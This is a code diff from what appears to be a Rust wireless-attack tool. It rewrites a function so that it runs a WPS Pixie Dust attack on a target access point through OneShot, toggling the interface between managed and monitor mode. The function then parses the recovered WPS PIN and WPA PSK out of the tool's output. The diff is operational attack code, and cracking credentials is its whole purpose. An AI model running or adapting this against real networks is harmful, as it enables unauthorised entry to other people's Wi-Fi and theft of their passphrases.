@@ -304,26 +304,50 @@ pub fn capture(distro: &str, iface: &str, bssid: &str, channel: &str, essid: &st
 }
 
 /// Run reaver PixieDust against one BSSID; parse PIN / PSK from output.
+/// PixieDust via OneShot (wpa_supplicant managed-mode association).
+///
+/// Deliberately NOT reaver-in-monitor: reaver's injection path has crashed
+/// the aic8800 driver under load, taking the whole WSL VM (and Docker
+/// Desktop, which shares it) down. OneShot associates normally — the same
+/// way it runs on rooted Android — and stresses the driver far less.
 pub fn pixie(distro: &str, iface: &str, bssid: &str, timeout_sec: u64) -> Result<PixieOut> {
     let script = format!(
-        "timeout {t} reaver -i {i} -b {b} --pixie-dust -vv 2>&1; echo __DONE__",
+        r#"ip link set {i} down 2>/dev/null
+iw dev {i} set type managed 2>&1
+ip link set {i} up 2>/dev/null
+mkdir -p /var/run/wpa_supplicant
+timeout {t}s python3 /opt/OneShot/oneshot.py -i {i} -b {b} -v 2>&1
+ip link set {i} down 2>/dev/null
+iw dev {i} set type monitor 2>/dev/null
+ip link set {i} up 2>/dev/null
+echo __ONEShot_DONE__"#,
         t = timeout_sec,
         i = iface,
         b = bssid
     );
-    let out = kali(distro, &script)?;
+    let raw = kali(distro, &script)?;
+    // strip ANSI color escapes (oneshot colorizes even when piped)
+    let re_ansi = regex::Regex::new(r"\[[0-9;]*m").unwrap();
+    let out = re_ansi.replace_all(&raw, "").to_string();
 
     let mut pin = None;
     let mut psk = None;
     for line in out.lines() {
-        if pin.is_none() {
-            if let Some(rest) = line.strip_prefix("[+] WPS PIN: ") {
-                pin = Some(rest.trim().trim_matches('\'').to_string());
+        let clean = line.trim();
+        if pin.is_none() && clean.contains("WPS PIN") {
+            if let Some(pos) = clean.find(": ") {
+                let v = clean[pos + 2..].trim().trim_matches(|c| c == '\u{27}' || c == '\u{22}').to_string();
+                if !v.is_empty() && v != "N/A" {
+                    pin = Some(v);
+                }
             }
         }
-        if psk.is_none() {
-            if let Some(rest) = line.strip_prefix("[+] WPA PSK: ") {
-                psk = Some(rest.trim().trim_matches('\'').to_string());
+        if psk.is_none() && clean.contains("WPA PSK") {
+            if let Some(pos) = clean.find(": ") {
+                let v = clean[pos + 2..].trim().trim_matches(|c| c == '\u{27}' || c == '\u{22}').to_string();
+                if !v.is_empty() && v != "N/A" {
+                    psk = Some(v);
+                }
             }
         }
     }
@@ -334,7 +358,8 @@ pub fn pixie(distro: &str, iface: &str, bssid: &str, timeout_sec: u64) -> Result
         .collect::<Vec<_>>()
         .into_iter()
         .rev()
-        .map(|l| format!("{}\n", l))
+        .map(|l| format!("{}
+", l))
         .collect();
     Ok(PixieOut {
         bssid: bssid.to_string(),
